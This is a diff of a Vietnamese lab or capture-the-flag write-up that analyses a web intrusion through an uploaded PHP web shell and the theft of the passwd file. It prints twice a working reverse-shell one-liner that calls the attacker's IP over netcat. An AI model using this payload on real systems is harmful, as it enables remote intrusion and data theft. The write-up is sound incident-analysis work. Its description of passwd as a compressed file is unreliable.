@@ -29,7 +29,7 @@ Trong quá trình kiểm tra, phát hiện tệp đáng ngờ có tên:
 Payload được nhúng trong tệp PHP là reverse shell:
 ```php<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 117.11.88.124 8080 >/tmp/f"); ?>```
 📌 Đây là shell nguy hiểm nhằm mở kết nối ngược từ nạn nhân về attacker.
-## ✅ Câu 4: Thư mục nào được trang web sử dụng để lưu trữ các tệp đã tải lên?
+## ✅ Câu hỏi 4: Thư mục nào được trang web sử dụng để lưu trữ các tệp đã tải lên?
 
 - Phân tích gói tin từ attacker cho thấy đường dẫn mà các tệp được tải lên là:
 
@@ -39,11 +39,27 @@ Payload được nhúng trong tệp PHP là reverse shell:
 
 ---
 
-## ✅ Câu 5: Cổng nào được mở trên máy của kẻ tấn công là mục tiêu của web shell độc hại nhằm thiết lập giao tiếp ra bên ngoài trái phép?
+## ✅ Câu hỏi 5: Cổng nào được mở trên máy của kẻ tấn công là mục tiêu của web shell độc hại nhằm thiết lập giao tiếp ra bên ngoài trái phép?
 
 - Phân tích nội dung web shell cho thấy reverse shell kết nối về IP attacker là `117.11.88.124`.
 
 - Câu lệnh trong file shell:
 
-```php
-<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 117.11.88.124 8080 >/tmp/f"); ?>```
+```php <?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 117.11.88.124 8080 >/tmp/f"); ?>```
+## ✅ Câu 6: Kẻ tấn công đang cố gắng đánh cắp tệp nào?
+![{2B227BB3-4C82-40A9-B660-A49CA7316828}](https://github.com/user-attachments/assets/d5beb312-4e49-4bf4-ab34-0cb9f8f695d6)
+
+📌 **Mục tiêu**: Nhận ra tầm quan trọng của dữ liệu bị xâm phạm để ưu tiên hành động ứng phó.
+
+🔍 **Phân tích**:
+- Dựa trên hình ảnh phân tích gói tin:
+  - Source IP: `24.49.63.79` (máy nạn nhân)
+  - Destination IP: `117.11.88.124` (máy attacker)
+  - Phương thức: `POST`
+  
+📄 **Tệp bị đánh cắp**: `passwd`
+
+🎯 Đây là một tệp nén có khả năng chứa thông tin quan trọng như dữ liệu đăng nhập, mật khẩu hoặc cấu hình nhạy cảm.
+
+➡️ Kết luận: Kẻ tấn công đã dùng reverse shell để thực hiện hành vi trộm tệp `passwd` từ máy nạn nhân và gửi về máy chủ điều khiển của mình.
+
